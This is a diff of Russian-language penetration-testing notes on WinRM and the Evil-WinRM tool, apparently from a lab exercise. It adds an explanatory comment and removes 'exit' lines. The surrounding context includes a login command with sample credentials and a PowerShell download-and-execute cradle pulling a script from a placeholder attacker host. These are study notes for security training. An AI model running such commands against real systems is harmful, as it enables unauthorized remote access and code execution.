@@ -6,6 +6,8 @@ Windows Remote Management (WinRM) — протокол Microsoft для удал
 
 Evil-WinRM — инструмент для интерактивных WinRM сессий с дополнительными возможностями (upload/download, загрузка скриптов в память, DLL injection).
 
+# WinRM — это сервер (служба), которая работает на удаленной машине и слушает входящие запросы.
+
 
 # КЛЮЧЕВЫЕ ОТЛИЧИЯ ОТ PSEXEC
 
@@ -69,9 +71,6 @@ evil-winrm -i 192.168.13.51 -u jdoe -p 'Summer2026!'
 type C:\Users\Administrator\Desktop\flag4.txt
 Access is denied.
 
-# ВЫХОД ИЗ СЕССИИ
-exit
-
 
 # КОГДА ИСПОЛЬЗОВАТЬ EVIL-WINRM
 
@@ -98,5 +97,4 @@ download C:\remote_file.txt
 ## Загрузить PowerShell скрипт в память:
 C:\Windows\System32\powershell.exe -exec bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://ATTACK_IP/script.ps1')"
 
-## Выйти:
-exit
+
